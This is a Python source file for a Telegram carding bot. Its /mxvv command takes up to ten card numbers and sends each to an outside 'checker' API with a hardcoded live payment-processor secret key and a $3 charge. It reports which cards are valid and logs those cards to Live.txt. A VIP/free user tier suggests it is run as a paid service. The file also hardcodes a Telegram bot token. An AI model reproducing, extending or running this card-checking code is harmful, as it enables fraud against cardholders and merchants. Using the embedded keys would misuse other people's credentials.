import requests
import time
import json
import os
from telegram import Update
from telegram.ext import CommandHandler, CallbackContext, Application

MAX_RETRIES = 5

# Function to check the CC
async def check_cc(cc, amount, currency, bot, chat_id, username, vip_status, retry_count=0):
    if retry_count > MAX_RETRIES:
        await bot.send_message(chat_id=chat_id, text=f"{cc} Max retries exceeded.")
        return

    url = "https://api.mvy.ai/"
    params = {
        "lista": cc,
        "sk": "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",
        "amount": amount,
        "currency": currency,
    }

    try:
        start_time = time.time()
        response = requests.get(url, params=params)
        end_time = time.time()
        total_time = end_time - start_time

        if not response.text:
            result = f"{cc} Empty response ❌ Time Taken: {total_time:.2f} seconds"
        else:
            response_data = response.json()
            message = response_data.get('message', '')
            result = message + " ✅" if 'declined' not in message.lower() else message + " ❌"

            if 'declined' not in message.lower():
                save_live_response(cc, message)

        response_message = f"♤ Card: <code>{cc}</code>\n♤ Response: {result}\n♤ Time Taken: {total_time:.2f}s\n♤ Checked By: @{username} [{vip_status}]\n"
        await bot.send_message(chat_id=chat_id, text=response_message, parse_mode='HTML', disable_web_page_preview=True)

    except requests.exceptions.RequestException as e:
        await bot.send_message(chat_id=chat_id, text=f"{cc} Request Exception: {str(e)}. Retrying...")
        if retry_count < MAX_RETRIES:
            time.sleep(1)
            await check_cc(cc, amount, currency, bot, chat_id, username, vip_status, retry_count + 1)

    except json.JSONDecodeError as e:
        await bot.send_message(chat_id=chat_id, text=f"{cc} JSON Decode Error: {str(e)}")

def save_live_response(cc, message):
    with open('Live.txt', 'a') as file:
        file.write(f"CC: {cc}\nResponse: {message}\n\n")

def is_vip(user_id):
    with open("vip.txt", "r") as f:
        vip_users = f.readlines()
    return str(user_id) + "\n" in vip_users

async def xvv(update: Update, context: CallbackContext):
    try:
        args = context.args
        if not args:
            raise ValueError("No CC provided")
        
        amount = 3.0
        currency = "usd"
        bot = context.bot
        chat_id = update.effective_chat.id
        username = update.effective_user.username
        user_id = update.effective_user.id
        vip_status = "OWNER" if is_vip(user_id) else "FREE"

        for cc in args[:10]:  # Limit to processing a maximum of 10 cards at a time
            formatted_cc = cc.replace('|', ':')
            await check_cc(formatted_cc, amount, currency, bot, chat_id, username, vip_status)

    except ValueError as e:
        await update.message.reply_text(str(e))
    except Exception as e:
        await update.message.reply_text("Error processing request: " + str(e))

def main():
    bot_token = "7266886772:AAFbSsQc2EiIXZ5XBoU2H7m9ci6mevp7LKQ"
    application = Application.builder().token(bot_token).build()
    application.add_handler(CommandHandler("mxvv", xvv))
    application.run_polling()

if __name__ == "__main__":
    main()
  
